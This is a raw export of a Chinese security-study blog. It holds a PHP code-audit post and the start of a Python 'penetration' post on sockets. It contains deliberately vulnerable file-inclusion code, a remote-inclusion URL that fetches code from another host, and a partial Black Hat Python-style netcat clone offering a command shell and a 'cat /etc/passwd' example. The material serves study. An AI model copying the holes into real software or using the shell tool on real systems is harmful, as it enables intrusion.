<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">//初始化....</span></span><br><span class="line">define(<span class="string">"ROOT"</span>,dirname(<span class="string">'_FILE_'</span>).<span class="string">'/'</span>);</span><br><span class="line"><span class="comment">//加载模块</span></span><br><span class="line">$mod=$_GET[<span class="string">'mod'</span>];</span><br><span class="line"><span class="keyword">echo</span> ROOT.$mod.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include</span>(ROOT.$mod.<span class="string">'.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//5.2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5.png" style="zoom:80%;">

<p>本地文件包含是指只能包含本机文件的文件包含漏洞，大多出现在<strong>模块加载、模板加载和cache调用</strong>这些地方</p>
<p>本地文件包含有多种利用方式，比如上传一个<strong>允许上传的文件格式的文件</strong>再包含来执行代码，包含PHP上传的临时文件</p>
<p>在请求URL或者ua里面加入要执行的代码，<strong>WebServer记录到日志后再包含WebServer的日志</strong></p>
<h4 id="1-3-远程文件包含"><a href="#1-3-远程文件包含" class="headerlink" title="1.3 远程文件包含"></a><strong>1.3 远程文件包含</strong></h4><p>远程文件包含是指可以包含远程文件的包含漏洞，远程文件包含需要设置<strong>allow_url_include=On</strong></p>
<p>相对于本地文件包含，它更容易利用，但出现的频率较低</p>
<p>下面是基于HTTP协议测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'url'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/phpsafe/5.2.php?url=http://192.168.2.108/1.txt</span></span><br><span class="line"><span class="comment">//1.txt的内容是<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">//打印出本机phpinfo的信息</span></span><br></pre></td></tr></table></figure>

<p>远程文件包含还有一种PHP输入输出流的利用方式，可以直接执行POST代码</p>
<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.png" style="zoom:80%;">

<h4 id="1-4-文件包含截断"><a href="#1-4-文件包含截断" class="headerlink" title="1.4 文件包含截断"></a><strong>1.4 文件包含截断</strong></h4><p>第一种是利用%00来截断，这是最古老的一种</p>
<hr>
<h2 id="PHP常用函数"><a href="#PHP常用函数" class="headerlink" title="PHP常用函数"></a>PHP常用函数</h2><h3 id="print-r-函数"><a href="#print-r-函数" class="headerlink" title="print_r() 函数"></a><strong>print_r() 函数</strong></h3><p><strong>print_r()</strong> 函数用于打印变量，以更容易理解的形式展示，PHP 版本要求: PHP 4, PHP 5, PHP 7</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span> (<span class="string">'a'</span> =&gt; <span class="string">'apple'</span>, <span class="string">'b'</span> =&gt; <span class="string">'banana'</span>, <span class="string">'c'</span> =&gt; <span class="keyword">array</span> (<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>));</span><br><span class="line">print_r ($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( [a] =&gt; apple [b] =&gt; banana [c] =&gt; <span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; x [<span class="number">1</span>] =&gt; y [<span class="number">2</span>] =&gt; z ) )</span><br></pre></td></tr></table></figure>



<h3 id="echo、print、print-r-三者区别"><a href="#echo、print、print-r-三者区别" class="headerlink" title="echo、print、print_r 三者区别"></a><strong>echo、print、print_r 三者区别</strong></h3><table>
<thead>
<tr>
<th align="center"></th>
<th align="center">属性</th>
<th align="center">打印输出</th>
<th align="center">用法</th>
<th align="center">返回值</th>
<th align="center">执行          速率</th>
</tr>
</thead>
<tbody><tr>
<td align="center">echo</td>
<td align="center">PHP语句</td>
<td align="center">输出一个或者多个字符串</td>
<td align="center">echo   或者 echo()</td>
<td align="center">无</td>
<td align="center">最快</td>
</tr>
<tr>
<td align="center">print</td>
<td align="center">实际上不是函数（而是语言结构），所以可以不用圆括号包围参数列表</td>
<td align="center">只能打印出简单类型变量的值(如int,string)</td>
<td align="center">print  或者print()</td>
<td align="center">1</td>
<td align="center">其次</td>
</tr>
<tr>
<td align="center">print_r</td>
<td align="center">函数,语句没有返回值,函数可以有返回值(即便没有用)</td>
<td align="center">可以打印出复杂类型变量的值(如数组,对象)</td>
<td align="center">print_r()</td>
<td align="center">输出成功时，返回true，不成功时返回false</td>
<td align="center">最慢</td>
</tr>
</tbody></table>
<hr>
<h2 id="SQL常用语句解释"><a href="#SQL常用语句解释" class="headerlink" title="SQL常用语句解释"></a>SQL常用语句解释</h2><h3 id="union"><a href="#union" class="headerlink" title="union"></a>union</h3><p>select <strong>id,username</strong> from userinfo  where id=1 <strong>union</strong> select <strong>1,2</strong></p>
<p>注意，union前后的列数要一样！</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>python渗透之路</title>
    <url>/2020/03/12/python%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<hr>
<hr>
<h3 id="python网络编程"><a href="#python网络编程" class="headerlink" title="python网络编程"></a><strong>python网络编程</strong></h3><h4 id="1-TCP客户端编程"><a href="#1-TCP客户端编程" class="headerlink" title="1.TCP客户端编程"></a>1.TCP客户端编程</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入socket库:</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个socket:</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># 建立连接:</span></span><br><span class="line">s.connect((<span class="string">'www.sina.com.cn'</span>, <span class="number">80</span>))</span><br></pre></td></tr></table></figure>

<p>创建Socket时，AF_INET指定使用IPv4协议，如果要用更先进的IPv6，就指定为AF_INET6。</p>
<p><strong>SOCK_STREAM指定使用面向流的TCP协议</strong>，这样，一个Socket对象就创建成功，但是还没有建立连接。<br>客户端要主动发起TCP连接，必须知道服务器的IP地址和端口号。<br><strong>作为服务器，提供什么样的服务，端口号就必须固定下来</strong>。由于我们想要访问网页，因此新浪提供网页服务的服务器必须把端口号固定在80端口，<strong>因为80端口是Web服务的标准端口</strong>。</p>
<p>其他服务都有对应的标准端口号,例如SMTP服务是25端口，FTP服务是21端口，等等。</p>
<p>端口号小于1024的是Internet标准服务的端口，端口号大于1024的，可以任意使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s.connect((<span class="string">'www.sina.com.cn'</span>, <span class="number">80</span>))</span><br></pre></td></tr></table></figure>

<p>注意参数是一个<code>tuple</code>（元组），包含地址和端口号。</p>
<p>建立TCP连接后，我们就可以向新浪服务器发送请求，要求返回首页的内容：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 发送数据:</span></span><br><span class="line">s.send(<span class="string">b'GET / HTTP/1.1\r\nHost: www.sina.com.cn\r\nConnection: close\r\n\r\n'</span>)</span><br></pre></td></tr></table></figure>

<p>TCP连接创建的是双向通道，双方都可以同时给对方发数据。但是谁先发谁后发，怎么协调，要根据具体的协议来决定。例如，HTTP协议规定客户端必须先发请求给服务器，服务器收到后才发数据给客户端。</p>
<p>发送的文本格式必须符合HTTP标准，如果格式没问题，接下来就可以接收新浪服务器返回的数据了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 接收数据:</span></span><br><span class="line">buffer = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 每次最多接收1k字节:</span></span><br><span class="line">    d = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> d:</span><br><span class="line">        buffer.append(d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">data = <span class="string">b''</span>.join(buffer)</span><br></pre></td></tr></table></figure>

<p>接收数据时，调用<code>recv(max)</code>方法，一次最多接收指定的字节数，因此，在一个while循环中反复接收，直到<code>recv()</code>返回空数据，表示接收完毕，退出循环。</p>
<p>当我们接收完数据后，调用<code>close()</code>方法关闭Socket，这样，一次完整的网络通信就结束了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 关闭连接:</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<p>接收到的数据包括HTTP头和网页本身，我们只需要把HTTP头和网页分离一下，把HTTP头打印出来，网页内容保存到文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">header, html = data.split(<span class="string">b'\r\n\r\n'</span>, <span class="number">1</span>)</span><br><span class="line">print(header.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="comment"># 把接收的数据写入文件:</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'sina.html'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(html)</span><br></pre></td></tr></table></figure>

<p>现在，只需要在浏览器中打开这个<code>sina.html</code>文件，就可以看到新浪的首页了。</p>
<p>需要注意的是，直接访问新浪会返回301，重定向到https:sina.com.cn，所以这里需要进行HTTPS连接，改为443端口</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"></span><br><span class="line">s=ssl.wrap_socket(socket.socket(socket.AF_INET,socket.SOCK_STREAM))</span><br><span class="line"><span class="comment">#s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span></span><br><span class="line">s.connect((<span class="string">'www.orld.top'</span>,<span class="number">443</span>))</span><br><span class="line">s.send(<span class="string">b'GET / HTTP/1.1\r\nHost: www.orld.top\r\n\r\n'</span>)</span><br><span class="line"><span class="comment">#User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0\r\n</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"ok:"</span>)</span><br><span class="line">buffer=[]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    d=s.recv(<span class="number">8192</span>)</span><br><span class="line">    <span class="keyword">if</span> d:</span><br><span class="line">        print(d)</span><br><span class="line">        buffer.append(d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">data=<span class="string">b''</span>.join(buffer)</span><br><span class="line">s.close()</span><br><span class="line">header,html=data.split(<span class="string">b'\r\n\r\n'</span>,<span class="number">1</span>)</span><br><span class="line">print(header.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'C:/Users/最恐怖的小怪兽/Desktop/123.html'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(html)</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: nginx</span><br><span class="line"><span class="attribute">Date</span>: Sat, 21 Mar 2020 12:29:16 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br><span class="line"><span class="attribute">Content-Length</span>: 539941</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">ETag</span>: "5e760817-7ea13"V=CCD0B746</span><br><span class="line"><span class="attribute">X-Powered-By</span>: shci_v1.03</span><br><span class="line"><span class="attribute">Expires</span>: Sat, 21 Mar 2020 12:29:23 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=60</span><br><span class="line"><span class="attribute">X-Via-SSL</span>: ssl.25.sinag1.yzyh.lb.sinanode.com</span><br><span class="line"><span class="attribute">Age</span>: 53</span><br><span class="line"><span class="attribute">Via</span>: https/1.1 ctc.guangzhou.union.182 (ApacheTrafficServer/6.2.1 [cRs f ]), https/1.1 cnc.guangzhou.union.69 (ApacheTrafficServer/6.2.1 [cRs f ])</span><br><span class="line"><span class="attribute">X-Via-Edge</span>: 1584793756134266f61d3f0065a703ed25d82</span><br><span class="line"><span class="attribute">X-Cache</span>: HIT.69</span><br><span class="line"><span class="attribute">X-Via-CDN</span>: f=edge,s=cnc.guangzhou.union.73.nb.sinaedge.com,c=211.97.111.38;f=edge,s=cnc.guangzhou.union.69.nb.sinaedge.com,c=112.90.6.73;f=Edge,s=cnc.guangzhou.union.69,c=112.90.6.69</span><br></pre></td></tr></table></figure>

<h4 id="2-TCP服务器编程"><a href="#2-TCP服务器编程" class="headerlink" title="2.TCP服务器编程"></a><strong>2.TCP服务器编程</strong></h4><p>和客户端编程相比，服务器编程就要复杂一些。</p>
<p>服务器进程首先要绑定一个端口并监听来自其他客户端的连接。如果某个客户端连接过来了，服务器就与该客户端建立Socket连接，随后的通信就靠这个Socket连接了。</p>
<p>所以，服务器会打开固定端口（比如80）监听，每来一个客户端连接，就创建该Socket连接。由于服务器会有大量来自客户端的连接，所以，服务器要能够区分一个Socket连接是和哪个客户端绑定的。</p>
<p><strong>一个Socket依赖4项：服务器地址、服务器端口、客户端地址、客户端端口来唯一确定一个Socket。</strong></p>
<p>但是服务器还需要同时响应多个客户端的请求，所以，<strong>每个连接都需要一个新的进程或者新的线程来处理</strong>，否则，服务器一次就只能服务一个客户端了。</p>
<p>我们来编写一个简单的服务器程序，它接收客户端连接，把客户端发过来的字符串加上<code>Hello</code>再发回去。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span><span class="params">()</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">'127.0.0.1'</span>,<span class="number">8888</span>))</span><br><span class="line">    s.listen(<span class="number">5</span>)</span><br><span class="line">    print(<span class="string">"waiting for connection ..."</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sock,addr=s.accept()</span><br><span class="line">        t=threading.Thread(target=tcplink,args=(sock,addr))</span><br><span class="line">        t.start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcplink</span><span class="params">(sock,addr)</span>:</span></span><br><span class="line">    print(<span class="string">'Accept new connection from %s:%s...'</span>%addr)</span><br><span class="line">    sock.send(<span class="string">b'welcome!'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data=sock.recv(<span class="number">1024</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data <span class="keyword">or</span> data.decode(<span class="string">'utf-8'</span>)==<span class="string">'exit'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sock.send((<span class="string">'Hello,%s!'</span> % data.decode(<span class="string">'utf-8'</span>)).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    sock.close()<span class="comment">#注意等循环结束再关闭</span></span><br><span class="line">    print(<span class="string">'connetion from %s:%s closed'</span>%addr)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    server()</span><br></pre></td></tr></table></figure>

<p>客户端发送数据检测：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># 建立连接:</span></span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>))</span><br><span class="line"><span class="comment"># 接收欢迎消息:</span></span><br><span class="line">print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> [<span class="string">b'Michael'</span>, <span class="string">b'Tracy'</span>, <span class="string">b'Sarah'</span>]:</span><br><span class="line">    <span class="comment"># 发送数据:</span></span><br><span class="line">    s.send(data)</span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">s.send(<span class="string">b'exit'</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<p>首先，创建一个基于IPv4和TCP协议的Socket：</p>
<p>然后，我们要绑定监听的地址和端口。服务器可能有多块网卡，可以绑定到某一块网卡的IP地址上，也可以用<strong><code>0.0.0.0</code>绑定到所有的网络地址</strong>，还可以用<code>127.0.0.1</code>绑定到本机地址。<code>127.0.0.1</code>是一个特殊的IP<strong>地址</strong>，表示本机地址，如果绑定到这个地址，客户端必须同时在本机运行才能连接，也就是说，外部的计算机无法连接进来。</p>
<p>端口号需要预先指定。因为我们写的这个服务不是标准服务，所以用<code>8888</code>这个端口号。请注意，<strong>小于<code>1024</code>的端口号必须要有管理员权限才能绑定：</strong></p>
<p><code>accept()</code>会等待并返回一个客户端的连接:</p>
<p>我们需要打开两命令行窗口，一个运行服务器程序，另一个运行客户端程序，就可以看到效果了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">┌────────────────────────────────────────────────────────┐</span><br><span class="line">│Command Prompt                                    - □ x │</span><br><span class="line">├────────────────────────────────────────────────────────┤</span><br><span class="line">│$ python echo_server.py                                 │</span><br><span class="line">│Waiting <span class="keyword">for</span> connection...                               │</span><br><span class="line">│Accept new connection <span class="keyword">from</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">64398.</span>..           │</span><br><span class="line">│Connection <span class="keyword">from</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">64398</span> closed.                 │</span><br><span class="line">│                                                        │</span><br><span class="line">│       ┌────────────────────────────────────────────────┴───────┐</span><br><span class="line">│       │Command Prompt                                    - □ x │</span><br><span class="line">│       ├────────────────────────────────────────────────────────┤</span><br><span class="line">│       │$ python echo_client.py                                 │</span><br><span class="line">│       │Welcome!                                                │</span><br><span class="line">│       │Hello, Michael!                                         │</span><br><span class="line">└───────┤Hello, Tracy!                                           │</span><br><span class="line">        │Hello, Sarah!                                           │</span><br><span class="line">        │$                                                       │</span><br><span class="line">        │                                                        │</span><br><span class="line">        │                                                        │</span><br><span class="line">        └────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>

<p>TCP小结</p>
<p>用TCP协议进行Socket编程在Python中十分简单，对于客户端，要主动连接服务器的IP和指定端口，对于服务器，要首先监听指定端口，然后，对每一个新的连接，创建一个线程或进程来处理。通常，服务器程序会无限运行下去。</p>
<p>同一个端口，被一个Socket绑定了以后，就不能被别的Socket绑定了。</p>
<h4 id="3-UDP客户端"><a href="#3-UDP客户端" class="headerlink" title="3.UDP客户端"></a>3.UDP客户端</h4><p>TCP是建立可靠连接，并且通信双方都可以以流的形式发送数据。相对TCP，UDP则是面向无连接的协议。</p>
<p>使用UDP协议时，不需要建立连接，<strong>只需要知道对方的IP地址和端口号，就可以直接发数据包。但是，能不能到达就不知道了。</strong></p>
<p>虽然用UDP传输数据不可靠，但它的优点是和TCP比，速度快，对于不要求可靠到达的数据，就可以使用UDP协议。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.bind((<span class="string">'127.0.0.1'</span>,<span class="number">9999</span>))</span><br><span class="line">print(<span class="string">'bind udp on 9999'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data, addr=s.recvfrom(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'Received from %s:%s.'</span> % addr)</span><br><span class="line">    print(data.decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    s.sendto(<span class="string">b'Hello, %s!'</span> % data, addr)</span><br></pre></td></tr></table></figure>

<p>创建Socket时，<strong><code>SOCK_DGRAM</code>指定了这个Socket的类型是UDP</strong>。绑定端口和TCP一样，但是<strong>不需要调用<code>listen()</code>方法</strong>，而是直接接收来自任何客户端的数据：</p>
<p><code>recvfrom()</code>方法<strong>返回数据和客户端的地址与端口</strong>，这样，服务器收到数据后，直接调用<code>sendto()</code>就可以把数据用UDP发给客户端。</p>
<p><strong>注意这里省掉了多线程</strong>，因为这个例子很简单。</p>
<p>客户端使用UDP时，首先仍然创建基于UDP的Socket，然后，<strong>不需要调用<code>connect()</code>，直接通过<code>sendto()</code>给服务器</strong>发数据：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> [<span class="string">b'Michael'</span>, <span class="string">b'Tracy'</span>, <span class="string">b'Sarah'</span>]:</span><br><span class="line">    <span class="comment"># 发送数据:</span></span><br><span class="line">    s.sendto(data, (<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>))</span><br><span class="line">    <span class="comment"># 接收数据:</span></span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<p>从服务器接收数据仍然调用<code>recv()</code>方法。</p>
<p>仍然用两个命令行分别启动服务器和客户端测试，结果如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">┌────────────────────────────────────────────────────────┐</span><br><span class="line">│Command Prompt                                    - □ x │</span><br><span class="line">├────────────────────────────────────────────────────────┤</span><br><span class="line">│$ python udp_server.py                                  │</span><br><span class="line">│Bind UDP on <span class="number">9999.</span>..                                     │</span><br><span class="line">│Received <span class="keyword">from</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">63823.</span>..                        │</span><br><span class="line">│Received <span class="keyword">from</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">63823.</span>..                        │</span><br><span class="line">│Received <span class="keyword">from</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">63823.</span>..                        │</span><br><span class="line">│       ┌────────────────────────────────────────────────┴───────┐</span><br><span class="line">│       │Command Prompt                                    - □ x │</span><br><span class="line">│       ├────────────────────────────────────────────────────────┤</span><br><span class="line">│       │$ python udp_client.py                                  │</span><br><span class="line">│       │Welcome!                                                │</span><br><span class="line">│       │Hello, Michael!                                         │</span><br><span class="line">└───────┤Hello, Tracy!                                           │</span><br><span class="line">        │Hello, Sarah!                                           │</span><br><span class="line">        │$                                                       │</span><br><span class="line">        │                                                        │</span><br><span class="line">        │                                                        │</span><br><span class="line">        └────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>

<p><strong>UDP小结</strong></p>
<p>UDP的使用与TCP类似，但是不需要建立连接。此外，<strong>服务器绑定UDP端口和TCP端口互不冲突</strong>，也就是说，UDP的9999端口与TCP的9999端口可以各自绑定。</p>
<h4 id="4-取代netcat"><a href="#4-取代netcat" class="headerlink" title="4.取代netcat"></a>4.取代netcat</h4><p>netcat的功能如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> threadin g</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义一些全局变量</span></span><br><span class="line">listen = <span class="literal">False</span></span><br><span class="line">command = <span class="literal">False</span></span><br><span class="line">upload = <span class="literal">False</span></span><br><span class="line">execute = <span class="string">""</span></span><br><span class="line">target = <span class="string">""</span></span><br><span class="line">upload_destination = <span class="string">""</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"BHP Net Tool"</span>)</span><br><span class="line">    print()</span><br><span class="line">    print(<span class="string">"Usage: bhpnet.py -t targt_host -p port"</span>)</span><br><span class="line">    print(<span class="string">"-l --listen          - listen on [host]:[port] for incoming connections"</span>)</span><br><span class="line">    print(<span class="string">"-e --execute=file_to_run - execute the given file upon receiving a connetction"</span>)</span><br><span class="line">    print(<span class="string">"-c command           - initialize a command shell"</span>)</span><br><span class="line">    print(<span class="string">"-u --upload-destination  - upon receiving connection upload a file and write to [destionation]"</span>)</span><br><span class="line">    print()</span><br><span class="line">    print()</span><br><span class="line">    print(<span class="string">"Examples: "</span>)</span><br><span class="line">    print(<span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -c"</span>)</span><br><span class="line">    print(<span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"</span>)</span><br><span class="line">    print(<span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""</span>)</span><br><span class="line">    print(<span class="string">"echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_sender</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#连接到目标主机</span></span><br><span class="line">        client.connect((target,port))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(buffer): <span class="comment">#检测是否从标准输入中接收到数据</span></span><br><span class="line">            client.send(buffer.encode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            recv_len = <span class="number">1</span></span><br><span class="line">            response = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> recv_len:</span><br><span class="line"></span><br><span class="line">                data = client.recv(<span class="number">4096</span>) <span class="comment">#接收回传数据</span></span><br><span class="line">                recv_len = len(data)</span><br><span class="line">                response+= data.decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> recv_len &lt; <span class="number">4096</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            print(response)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#等待更多的输入</span></span><br><span class="line">            buffer = input(<span class="string">""</span>) <span class="comment">#python3中没有raw_input()</span></span><br><span class="line">            buffer += <span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line">            client.send(buffer.encode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[*] Exception! Exiting."</span>)</span><br><span class="line">        client.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果没有定义目标，那么我们监听所有接口</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(target):</span><br><span class="line">        target = <span class="string">"0.0.0.0"</span></span><br><span class="line"></span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.bind((target,port))</span><br><span class="line"></span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, addr = server.accept()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#分拆一个线程处理新的客户端</span></span><br><span class="line">        client_thread = threading.Thread(target=client_handler,</span><br><span class="line">                                         args=(client_socket,))</span><br><span class="line">        client_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(command)</span>:</span></span><br><span class="line"></span><br><span class="line">    command = command.rstrip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        output = <span class="string">"Failed to execute command.\r\n"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 